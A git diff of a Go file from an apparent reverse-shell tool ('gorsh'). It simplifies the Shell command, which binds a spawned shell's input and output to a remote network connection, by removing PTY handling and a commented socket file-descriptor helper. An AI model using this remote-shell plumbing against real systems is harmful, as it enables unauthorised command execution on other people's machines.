@@ -1,14 +1,9 @@
 package cmds
 
 import (
-	"fmt"
-	"io"
-	"syscall"
-
 	"git.hyrule.link/blink/gorsh/pkg/myconn"
 	"git.hyrule.link/blink/gorsh/pkg/shell"
 	"github.com/abiosoft/ishell"
-	"github.com/creack/pty"
 )
 
 func Shell(c *ishell.Context) {
@@ -18,26 +13,7 @@ func Shell(c *ishell.Context) {
 	cmd.Stdin = myconn.Conn
 	cmd.Stdout = myconn.Conn
 
-	attrs := &syscall.SysProcAttr{
-		Ctty:       3,
-		Foreground: true,
-	}
-
-	ptmx, err := pty.StartWithAttrs(cmd, nil, attrs)
-	// ptmx, err := pty.Start(cmd)
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
-	defer ptmx.Close()
-
-	// send stdout to the remote conn
-	go func() { io.Copy(myconn.Conn, ptmx) }()
-
-	// wait for commands or EOF from conn
-	for {
-		io.Copy(ptmx, myconn.Conn)
-	}
+	cmd.Run()
 }
 
 func Exec(c *ishell.Context) {
@@ -52,11 +28,3 @@ func Exec(c *ishell.Context) {
 		return
 	}
 }
-
-// // GetFdFromConn get net.Conn's file descriptor.
-// func GetFdFromConn(l myconn.Writer) int {
-// 	v := reflect.ValueOf(l)
-// 	netFD := reflect.Indirect(reflect.Indirect(v).FieldByName("fd"))
-// 	fd := int(netFD.FieldByName("sysfd").Int())
-// 	return fd
-// }
